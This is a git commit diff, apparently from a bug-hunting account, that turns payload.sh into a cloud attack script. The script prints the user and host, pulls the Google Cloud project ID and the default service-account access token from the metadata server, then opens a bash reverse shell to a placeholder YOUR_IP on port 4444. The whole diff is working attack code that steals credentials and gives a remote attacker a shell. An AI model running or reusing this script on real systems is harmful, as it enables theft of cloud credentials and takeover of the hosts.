b5d8397784c6ea98aebcc664b434309d5a70da61
envoybughunter <envoybughunter@gmail.com>
2025-07-01 12:26:20 +0300

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,4 +1,14 @@
 #!/bin/bash
 
-curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/
+echo "[+] User and Host:"
+whoami
+hostname
 
+echo "[+] Project ID:"
+curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id
+
+echo "[+] Token:"
+curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+echo "[+] Reverse shell başlatılıyor..."
+bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
